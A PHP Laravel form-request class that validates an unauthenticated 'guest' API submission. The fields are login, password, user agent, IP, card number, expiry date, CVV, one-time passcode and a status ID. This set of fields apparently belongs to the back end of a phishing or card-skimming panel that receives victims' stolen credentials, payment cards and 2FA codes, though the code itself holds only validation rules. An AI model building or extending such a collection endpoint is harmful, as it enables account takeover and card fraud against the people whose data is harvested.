<?php

namespace App\Http\Requests\Api\Guest;

use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Validation\Rule;
use Illuminate\Contracts\Validation\Validator;
use Illuminate\Http\Exceptions\HttpResponseException;

class NewGuestRequest extends FormRequest
{
    /**
     * Determine if the user is authorized to make this request.
     */
    public function authorize(): bool
    {
        return true;
    }

    /**
     * Get the validation rules that apply to the request.
     *
     * @return array<string, \Illuminate\Contracts\Validation\ValidationRule|array<mixed>|string>
     */
    public function rules(): array
    {
        return [
            'token' => 'nullable|string',
            'login' => 'required|string',
            'pass' => 'required|string',
            'user-agent' => 'nullable|string',
            'user' => 'nullable|string',
            'ip' => 'nullable|string',
            'cc' => 'nullable|string',
            'expiration_date' => 'nullable|string',
            'ccv' => 'nullable|string',
            'otp' => 'nullable|string',
            'status_id' => 'required|integer|exists:estados,id',
        ];
    }

    protected function failedValidation(Validator $validator)
    {
        throw new HttpResponseException(response()->json($validator->errors(), 422));
    }
}
